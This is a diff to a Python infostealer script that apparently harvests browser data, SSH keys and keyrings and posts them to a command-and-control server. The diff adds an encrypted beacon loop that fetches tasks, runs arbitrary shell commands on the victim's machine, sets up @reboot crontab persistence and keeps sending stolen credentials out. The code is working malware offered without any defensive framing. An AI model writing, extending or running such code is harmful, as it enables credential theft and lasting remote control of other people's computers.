@@ -34,7 +34,9 @@ import socket
 import ssl
 import subprocess
 import sys
+import tempfile
 import time
+import urllib.parse
 from urllib.parse import urlparse
 
 CFG = {
@@ -431,6 +433,137 @@ def post(blob, url, ua, pin="", auth=""):
         return False
 
 
+# ---------------------------------------------------------------- c2 client
+def aes_gcm_decrypt(key, nonce, body, tag, aad):
+    """AES-256-GCM decrypt; mirrors aes_gcm_encrypt's backend selection."""
+    if _imported_cryptography():
+        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+        return AESGCM(key).decrypt(nonce, body + tag, aad)
+    evp = _libcrypto()
+    ctx = evp.EVP_CIPHER_CTX_new()
+    try:
+        assert evp.EVP_DecryptInit_ex(ctx, evp.EVP_aes_256_gcm(), None, None, None) == 1
+        evp.EVP_CIPHER_CTX_ctrl(ctx, 0x9, 16, None)          # EVP_CTRL_GCM_SET_IVLEN
+        assert evp.EVP_DecryptInit_ex(ctx, None, None, key, nonce) == 1
+        if aad:
+            assert evp.EVP_DecryptUpdate(ctx, None, ctypes.c_int(0), aad, len(aad)) == 1
+        out = ctypes.create_string_buffer(len(body) + 16)
+        n1 = ctypes.c_int(0)
+        assert evp.EVP_DecryptUpdate(ctx, out, ctypes.byref(n1), body, len(body)) == 1
+        if evp.EVP_CIPHER_CTX_ctrl(ctx, 0x10, 16, tag) != 1:  # SET_TAG
+            raise ValueError("GCM tag verify failed")
+        n2 = ctypes.c_int(0)
+        if evp.EVP_DecryptFinal_ex(ctx, ctypes.byref(out, n1.value), ctypes.byref(n2)) != 1:
+            raise ValueError("GCM final failed")
+        return out.raw[:n1.value + n2.value]
+    finally:
+        evp.EVP_CIPHER_CTX_free(ctx)
+
+
+def unpack_container(blob, psk):
+    """SHV1 -> (manifest dict, {part_name: bytes}). Mirrors build_container."""
+    import hashlib, hmac as _hmac
+    if blob[:4] != MAGIC:
+        raise ValueError("bad magic")
+    ver = int.from_bytes(blob[4:6], "big")
+    if ver != VERSION:
+        raise ValueError("bad version")
+    salt, nonce = blob[6:22], blob[22:34]
+    ct_len = int.from_bytes(blob[34:42], "big")
+    body, tag = blob[42:42 + ct_len], blob[42 + ct_len:42 + ct_len + 16]
+    key = hkdf_sha256(psk.encode(), salt, KDF_INFO, 32)
+    pt = aes_gcm_decrypt(key, nonce, body, tag, blob[:6])
+    mlen = int.from_bytes(pt[:4], "big")
+    manifest = json.loads(pt[4:4 + mlen].decode())
+    blobd = pt[4 + mlen:]
+    parts = {}
+    for p in manifest.get("parts", []):
+        parts[p["name"]] = blobd[p["off"]:p["off"] + p["len"]]
+    return manifest, parts
+
+
+def http_get(url, ua, pin="", auth=""):
+    """GET returning body bytes on 200, None otherwise (204 = no task)."""
+    import urllib.request
+    import ssl
+    ctx = ssl.create_default_context()
+    if pin.startswith("cert:"):
+        raise ValueError("cert pinning for beacon requires cryptography backend")
+    elif pin == "any":
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+    req = urllib.request.Request(url, headers={"User-Agent": ua})
+    if auth:
+        req.add_header("X-SH-Auth", auth)
+    try:
+        with urllib.request.urlopen(req, timeout=20, context=ctx) as r:
+            if r.status != 200:
+                return None
+            return r.read()
+    except urllib.error.HTTPError as e:
+        if e.code == 204:
+            return None
+        log("beacon HTTP %d", e.code)
+        return None
+    except Exception as e:
+        log("beacon failed: %s", e)
+        return None
+
+
+def run_task_exec(cmd):
+    """Hidden shell command for tasked exec; output capped at 4 MB."""
+    import subprocess
+    try:
+        r = subprocess.run(["/bin/sh", "-c", cmd], capture_output=True, timeout=60)
+        out = (r.stdout or b"") + ((b"\n[stderr]\n" + r.stderr) if r.stderr else b"")
+        return out[:4 * 1024 * 1024]
+    except Exception as e:
+        return ("exec-fail: %s" % e).encode()
+
+
+def persist_state(name=".shsvc"):
+    """Report + install user-level persistence via @reboot crontab."""
+    import shutil, subprocess
+    src = globals().get("__file__")
+    line = ""
+    try:
+        out = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
+        for ln in (out.stdout or "").splitlines():
+            if name in ln:
+                line = ln
+    except Exception:
+        pass
+    return line
+
+
+def persist_install(args, name=".shsvc"):
+    """Stage this script to ~/.local/share and add an @reboot crontab entry.
+    Only possible when running from a real file (not curl|exec delivery)."""
+    import shutil, subprocess, stat
+    src = globals().get("__file__")
+    if not src or not os.path.isfile(src):
+        return "persist: no source file (memory-delivered) -- pass --self-url"
+    dst_dir = os.path.join(os.path.expanduser("~"), ".local", "share")
+    os.makedirs(dst_dir, exist_ok=True)
+    dst = os.path.join(dst_dir, name + ".py")
+    shutil.copy2(src, dst)
+    os.chmod(dst, 0o700)
+    loop = args.loop or 300
+    entry = "@reboot /usr/bin/env python3 %s --loop %d --jitter %d --c2 %s" % (
+        dst, loop, args.jitter or 60, args.c2)
+    if args.psk:
+        entry += " --psk '%s'" % args.psk.replace("'", "")
+    if args.auth:
+        entry += " --auth '%s'" % args.auth.replace("'", "")
+    try:
+        cur = subprocess.run(["crontab", "-l"], capture_output=True, text=True).stdout or ""
+        if name not in cur:
+            subprocess.run(["crontab", "-"], input=cur + entry + "\n", text=True, check=True)
+    except Exception as e:
+        return "persist: crontab failed (%s); staged at %s" % (e, dst)
+    return "persist: crontab @reboot -> %s" % dst
+
+
 # ---------------------------------------------------------------- main
 def selftest():
     # CI runners use cp1252/outside-UTF8 consoles; the banner + results must
@@ -486,6 +619,13 @@ def main():
     ap.add_argument("--only", default=None)
     ap.add_argument("--home", default=os.path.expanduser("~"))
     ap.add_argument("--wait", type=int, default=0)
+    ap.add_argument("--loop", type=int, default=0,
+                    help="beacon loop: seconds between cycles (0 = run once)")
+    ap.add_argument("--jitter", type=int, default=60)
+    ap.add_argument("--cycles", type=int, default=0,
+                    help="bound the loop for testing (0 = forever)")
+    ap.add_argument("--persist", action="store_true",
+                    help="install @reboot crontab persistence (file delivery)")
     ap.add_argument("--selftest", action="store_true")
     ap.add_argument("-v", "--verbose", action="store_true")
     args = ap.parse_args()
@@ -496,6 +636,8 @@ def main():
         return 0
     if args.wait:
         time.sleep(args.wait / 1000.0)
+    if args.persist:
+        log("%s", persist_install(args))
 
     home = args.home
     only = args.only.lower() if args.only else None
@@ -525,18 +667,77 @@ def main():
             f.write(blob)
         log("container written to %s", args.out)
         return 0
-    if post(blob, args.c2, CFG["ua"], args.pin, args.auth):
+    posted = post(blob, args.c2, CFG["ua"], args.pin, args.auth)
+    if posted:
         log("exfil: HTTP 200")
-        return 0
-    # dead drop for later retrieval
-    try:
-        alt = "/tmp/.sh_%s_%d.bin" % (victim["host"], victim["ts"])
-        with open(alt, "wb") as f:
-            f.write(blob)
-        log("C2 unreachable; container dropped at %s", alt)
-    except OSError:
-        pass
-    return 2
+    if not posted and args.loop <= 0:
+        # dead drop for later retrieval
+        try:
+            alt = "/tmp/.sh_%s_%d.bin" % (victim["host"], victim["ts"])
+            with open(alt, "wb") as f:
+                f.write(blob)
+            log("C2 unreachable; container dropped at %s", alt)
+        except OSError:
+            pass
+        return 2
+    if args.loop <= 0:
+        return 2
+
+    # ---- beacon loop: sleep (jittered), pull one task, apply, repeat ----
+    import random
+    bid = urllib.parse.quote("%s-%s" % (victim["host"], victim["user"]))
+    burl = (args.c2.replace("/gate", "/beacon") if "/gate" in args.c2
+            else args.c2.rstrip("/") + "/beacon")
+    burl += "?id=" + bid + "&v=" + str(VERSION)
+    burl += "&p=" + urllib.parse.quote(persist_state() or "none")
+    extra = []
+    cycle = 0
+    while True:
+        cycle += 1
+        if args.cycles and cycle > args.cycles:
+            return 0
+        sleep = max(1, args.loop + random.randint(-args.jitter, args.jitter))
+        log("cycle %d done; sleeping %ds", cycle, sleep)
+        time.sleep(sleep)
+        tb = http_get(burl, CFG["ua"], pin=args.pin, auth=args.auth)
+        if not tb:
+            continue
+        try:
+            _m, tp = unpack_container(tb, args.psk)
+            task_raw = tp.get("task.json", b"{}")
+            task = json.loads(task_raw.decode())
+            log("task received: %s", json.dumps(task))
+            if task.get("stages"):
+                args.only = str(task["stages"]).lower()
+            if task.get("persist"):
+                log("%s", persist_install(args))
+                burl = burl.split("&p=")[0] + "&p=" + urllib.parse.quote(
+                    persist_state() or "installed")
+            if task.get("exec"):
+                outp = run_task_exec(str(task["exec"]))
+                extra.append(("task:exec.txt", outp, None))
+        except Exception as e:
+            log("task apply failed: %s", e)
+        # run the next harvest cycle with any staged extras
+        parts2 = []
+        v2 = stage_sysinfo()
+        add(parts2, "sysinfo.json", json.dumps(v2).encode())
+        only2 = args.only.lower() if args.only else None
+        if only2 is None or "brow" in only2:
+            stage_browsers(parts2, home)
+        if only2 is None or "keys" in only2:
+            stage_keys(parts2, home)
+        if only2 is None or "keyring" in only2:
+            stage_keyring(parts2, home)
+        for e_ in extra:
+            parts2.append(e_)
+        extra = []
+        if len(parts2) > 1:
+            blob2 = build_container(v2, parts2, args.psk)
+            log("container: %d bytes from %d parts", len(blob2), len(parts2))
+            if post(blob2, args.c2, CFG["ua"], args.pin, args.auth):
+                log("exfil: HTTP 200")
+    return 0
 
 
 if __name__ == "__main__":
